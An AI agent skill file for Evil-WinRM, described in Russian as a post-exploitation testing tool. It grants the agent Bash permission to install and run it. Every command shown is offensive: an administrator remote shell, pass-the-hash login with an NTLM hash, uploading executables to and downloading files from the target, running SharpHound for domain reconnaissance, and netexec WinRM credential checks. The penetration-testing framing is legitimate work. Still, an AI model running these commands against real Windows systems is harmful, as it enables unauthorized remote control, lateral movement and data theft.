---
name: evil-winrm-cli
description: "Evil-WinRM — удалённое управление Windows через WinRM для постэксплуатационного тестирования. Установка: gem install evil-winrm. Используется совместно с netexec."
allowed-tools: Bash(evil-winrm *), Bash(gem *), Read
---

# evil-winrm-cli

Install check: `which evil-winrm || gem install evil-winrm`

## Key invocations

```bash
# Basic shell (password)
evil-winrm -i <target-ip> -u administrator -p 'Password123'

# Pass-the-hash
evil-winrm -i <target-ip> -u administrator -H <NTLM-hash>

# With SSL
evil-winrm -i <target-ip> -u admin -p pass -S

# Upload file
# Inside evil-winrm shell:
upload /local/path/file.exe C:\Windows\Temp\file.exe

# Download file
download C:\Windows\Temp\file.txt /local/path/

# Load PowerShell script
# Inside session:
menu  # shows loaded scripts
Invoke-Binary /local/path/SharpHound.exe

# With proxy
evil-winrm -i <target-ip> -u admin -p pass --proxy http://127.0.0.1:8080

# Check if WinRM open first (netexec)
nxc winrm <target-ip> -u admin -p pass
```
